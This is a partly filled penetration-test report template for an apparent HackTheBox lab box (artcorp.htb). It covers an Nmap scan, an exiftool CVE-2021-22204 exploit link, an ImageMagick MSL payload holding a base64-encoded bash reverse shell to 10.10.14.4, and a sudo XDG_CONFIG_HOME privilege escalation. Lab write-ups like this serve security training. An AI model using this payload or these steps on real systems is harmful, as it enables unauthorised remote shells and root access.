## Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, I was able to successfully gain access to **X** out of the **X** systems.

### System IP: 10.10.11.140

#### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

| Server IP Address | Ports Open      |
| ----------------- | --------------- |
| 10.10.11.140      | **TCP**: 22,80\ |

**Nmap Scan Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



*Initial Shell Vulnerability Exploited*

exiftools rce 

[CVE-2021-22204-exiftool]:https://github.com/convisolabs/CVE-2021-22204-exiftool

*Additional info about where the initial shell was acquired from*

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Proof of Concept Code Here:**

**Local.txt Proof Screenshot**

![image-20221221185720382](D:\OSCP\hackthebox\attachments\image-20221221185720382.png)

**Local.txt Contents**

#### Lateral Movement

```
pspy64 to scan the process
```

#### payload

```xml
<image authenticate='ff" `echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgJj4vZGV2L3Rjc
C8xMC4xMC4xNC40LzYwMDIgMD4mMScK | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="
http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

#### proof

![image-20221221191420241](D:\OSCP\hackthebox\attachments\image-20221221191420241.png)

#### Privilege Escalation

*Additional Priv Esc info*

XDG_CONFIG_HOME is env_keep, so modify it to the thomas home directory and create an config file consist exec command

![image-20221221192852229](D:\OSCP\hackthebox\attachments\image-20221221192852229.png)

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Exploit Code:**

exec /bin/bash

**Proof Screenshot Here:**